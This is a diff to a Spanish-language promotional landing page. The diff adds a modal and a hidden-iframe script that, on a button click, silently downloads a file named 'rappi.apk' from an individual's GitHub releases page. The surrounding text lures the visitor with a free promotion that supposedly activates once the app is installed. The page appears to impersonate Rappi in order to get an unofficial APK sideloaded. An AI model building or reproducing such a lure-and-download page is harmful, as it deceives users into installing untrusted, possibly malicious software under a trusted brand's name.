@@ -169,6 +169,39 @@
         cursor: pointer;
     }
 
+    /* ----- MENSAJE DE DESCARGA ----- */
+    .download-message {
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.7);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+    }
+
+    .download-message-box {
+        background: #ffffff;
+        border-radius: 16px;
+        padding: 20px 24px;
+        text-align: center;
+        max-width: 260px;
+        font-family: goldplay;
+        box-shadow: 0 0 25px rgba(0,0,0,0.4);
+    }
+
+    .download-message-box h2 {
+        margin: 0 0 8px;
+        font-size: 18px;
+        font-family: goldplaybold;
+        color: #333;
+    }
+
+    .download-message-box p {
+        margin: 0;
+        font-size: 14px;
+        color: #555;
+    }
 </style>
 </head>
 
@@ -197,8 +230,13 @@
         <img class="anim-img" src="img/descarga.png" alt="">
     </div>
 
-    <a href="#" class="button">¡Descargar ahora!</a>
-    <p style="font-size: 10px; margin-top: 120px;  font-family: goldplaybold;">Para obtener la promocion debes instalar la aplicación desde el enlance valido. Automatico se activara la promocion. No genera cargo adicionales ni necesitas afiliar tarjetas.</p>
+    <!-- Botón con ID para JS -->
+    <a href="#" class="button" id="downloadBtn">¡Descargar ahora!</a>
+
+    <p style="font-size: 10px; margin-top: 120px;  font-family: goldplaybold;">
+        Para obtener la promoción debes instalar la aplicación desde el enlace válido.
+        Automático se activará la promoción. No genera cargos adicionales ni necesitas afiliar tarjetas.
+    </p>
 </div>
 
 <!-- FOOTER -->
@@ -240,6 +278,42 @@
 
 </div> <!-- cierre mobile-only -->
 
+<!-- MENSAJE DE DESCARGA -->
+<div class="download-message" id="download-message">
+    <div class="download-message-box">
+        <h2>Descargando aplicación…</h2>
+        <p>Si la descarga no inicia, revisa la barra de descargas de tu navegador.</p>
+    </div>
+</div>
+
+<!-- IFRAME OCULTO PARA FORZAR DESCARGA SIN SALIR DE LA PÁGINA -->
+<iframe id="download-frame" style="display:none;"></iframe>
+
+<script>
+    (function () {
+        const btn = document.getElementById('downloadBtn');
+        const msg = document.getElementById('download-message');
+        const iframe = document.getElementById('download-frame');
+        const apkUrl = 'https://github.com/anthonyvaleroo/rappi/releases/download/v1.0/rappi.apk';
+
+        if (btn) {
+            btn.addEventListener('click', function (e) {
+                e.preventDefault(); // Evita salto de página por el <a href="#">
+
+                // Mostrar mensaje de "Descargando aplicación"
+                msg.style.display = 'flex';
+
+                // Iniciar descarga en un iframe oculto para no salir de la página
+                iframe.src = apkUrl;
+
+                // Ocultar mensaje después de unos segundos (opcional)
+                setTimeout(function () {
+                    msg.style.display = 'none';
+                }, 5000);
+            });
+        }
+    })();
+</script>
+
 </body>
 </html>
-
